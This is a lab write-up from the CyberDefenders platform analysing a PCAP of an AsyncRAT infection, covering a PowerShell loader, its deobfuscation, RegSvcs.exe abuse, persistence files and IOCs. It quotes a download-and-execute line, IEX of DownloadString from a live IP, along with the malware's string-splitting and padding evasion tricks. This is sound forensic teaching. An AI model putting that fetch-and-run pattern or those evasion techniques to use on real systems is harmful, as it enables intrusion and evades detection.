# 🛡️ Security Writeup – XMLRat

## 📌 Overview

* **Platform:** Cyberdefenders
* **Category:** Network Forensics
* **Difficulty:** Easy
* **Date:** 03/05/2026

---

## 📖 Scenario

A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

---

## 🎯 Objectives

Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading.

---

## 🧰 Tools & Techniques

* Tools: Wireshark, Cyberchef, Exiftool, Virustotal


---



## 🔍 Analysis


* The attacker successfully executed a command to download the first stage of the malware. From this information, we know that the attacker success in downloading his first stage so we filter for HTTP GET method.

  <img width="940" height="88" alt="image" src="https://github.com/user-attachments/assets/54b5274b-c9e0-4270-8270-d66a1622bf67" />

* The xlm.txt is the first stage of the malware the hacker trying to do. Now, we Follow HTTP Stream to find more information about this phase. He tried to hide his intention of execute the malicious script by cut the string into small strings

  <img width="1260" height="733" alt="image" src="https://github.com/user-attachments/assets/b274f21c-83ac-430e-b2da-fb7e58797378" />
  <img width="1226" height="760" alt="image" src="https://github.com/user-attachments/assets/f05825a9-df05-4921-8a4f-54f14a679d56" />

* Next, I will save the cut strings to "parts.txt" and then concanate it with python script combine.py

  <img width="647" height="501" alt="image" src="https://github.com/user-attachments/assets/d3e2a332-93d4-47cc-bc40-96a95bafbbf6" />

  <img width="640" height="453" alt="image" src="https://github.com/user-attachments/assets/779e10f6-b38a-4f40-88c0-44c207ed270a" />

* After executing the scrip we have a result string

  <img width="642" height="97" alt="image" src="https://github.com/user-attachments/assets/139ed3a9-938b-4dd0-8743-2b2d112fe6a0" />

#### Script explaination:

    String concatenation – The script is split across multiple variables ($A123, $B456, $C789) and later concatenated.

    Case manipulation – Mixed uppercase/lowercase (NeW-OBJeCT, NeT.WebCLIeNT) to bypass simple string‑based detection.

    Placeholder noise – Injected [Byte[]]; that does nothing but distract.

    Character removal – Uses .Replace('VAN','ADSTRING') to transform DOWNLOVAN into DOWNLOADSTRING.

    IeX alias – Short for Invoke-Expression (executes a string as PowerShell code)

    $A123 = (New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg'): Downloads the content of mdm.jpg (definitely not a normal .jpg file), the payload is treated as a string.
  
    IEX($A123): Executes the downloaded script immediately in memory – no file is written to disk, it stays in memory.

* The download IP address show a sign of harm as it is reported by multiple user

  <img width="1322" height="710" alt="image" src="https://github.com/user-attachments/assets/7ffa5868-03c2-47fc-bb96-20a1e9360ce8" />

* As we have said before, the previous script is just a loader and the second executable is mdm.jpg.

  <img width="1254" height="718" alt="image" src="https://github.com/user-attachments/assets/632f4cb5-65a4-41c2-a8c6-8c15df8c50db" />

  <img width="1288" height="736" alt="image" src="https://github.com/user-attachments/assets/8e05cb05-2d84-4d6a-ab83-76d3904a800a" />

* Deep dive into the malicious script, there are 2 variables "$hexString_bbb" and "$hexString_pe". Copy the entire variable and input to Cyberchef, remove the underscore character, save the file and we have a hash result of 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798

   <img width="1528" height="753" alt="image" src="https://github.com/user-attachments/assets/6eacb7a7-bc33-458d-8f69-dc8b243b1945" />

* After having the hash value of the malware, use Virustotal for more information. Due to Alibaba and other vendors, this malware family label is AsyncRat

  <img width="1816" height="656" alt="image" src="https://github.com/user-attachments/assets/48b59f49-bef5-45b4-9f22-284ba2ecb0b8" />

  <img width="1110" height="771" alt="image" src="https://github.com/user-attachments/assets/7e2d1ad0-0baa-4a78-9cf7-610825d81387" />

* Look at the history section of VirusTotal, we know the creation time of the malware

  <img width="551" height="164" alt="image" src="https://github.com/user-attachments/assets/83e70192-9e4c-4b56-ac77-d957257eacf7" />

* Have a closer look at the script, It seems that the hacker obfuscate the script to prevent it from being detected. 

  <img width="937" height="305" alt="image" src="https://github.com/user-attachments/assets/a6159b4b-8823-40c5-8191-29852123a124" />

#### Script explaination:

    $NA = 'C:\W#######indow############s\Mi####cr' -replace '#', '': Removing # gives: C:\Windows\Micr

    $AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe' -replace '#', '': The second part after removing # becomes: osoft.NET\Framework\v4.0.30319\RegSvcs.exe

    After concatenating, we have: C:\Windows\Micr + osoft.NET\Framework\v4.0.30319\RegSvcs.exe= C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe

    --> That is the full path to the LOLBin used for stealthy process execution.

    That path is passed as an argument to the malware’s Execute method. The script is calling the Execute method of the loaded PE (NewPE2.PE), giving it the path to RegSvcs.exe and a byte array.

    $VA = @($AC, $NKbb)          # $AC = path, $NKbb = some byte array (likely payload)
    $MZ.$CM($null, [object[]] $VA)

* The script is designed to drop several files, The command weites .ps1, .bat, .vbs file to disk, this is part of the persistence mechanism.

  <img width="652" height="226" alt="image" src="https://github.com/user-attachments/assets/466ec81c-c4e5-412a-813b-dbc5d4bf2201" />
  <img width="596" height="51" alt="image" src="https://github.com/user-attachments/assets/79f71c7a-00e0-4197-9349-0bc1c90c215c" />


---

## 🧾 IOCs

| Type | Value |
|------|-------|
| **IP Address** | `45[.]126.209.4` |
| **URL** | `http[:]//45.126.209.4:222/mdm.jpg` |
| **Malware SHA256** | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` |
| **Dropped Files** | `C:\Users\Public\Conted.ps1`<br>`C:\Users\Public\Conted.bat`<br>`C:\Users\Public\Conted.vbs` |
| **LOLBin Path** | `C[:]\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` |
| **Scheduled Task Name** | `Update Edge` |

---


## 🧬 Threat Context 

- **T1059.001** – PowerShell execution
- **T1053.005** – Scheduled Task for persistence
- **T1027** – Obfuscated files/scripts
- **T1218.009** – RegSvcs.exe LOLBin abuse
- **T1105** – Download of second-stage payload
- **T1071.001** – C2 over HTTP





---

## 💡 Lessons Learned

- **Obfuscation alone is not enough** – Simple techniques like string splitting, case‑mangling, and padding characters (`#`, `_`) can be easily reversed with basic tools (CyberChef, Python).

- **LOLBins are powerful evasion tools** – Attackers abuse trusted Windows binaries (`RegSvcs.exe`) to execute malicious code while bypassing application whitelisting. 

- **Always verify hash from decoded content** – he real payload is often encoded inside.

- **Threat intelligence enriches analysis** – Looking up IPs and hashes on VirusTotal or AlienVault quickly reveals malware families (AsyncRAT), hosting providers, and historical context (creation timestamp).

---





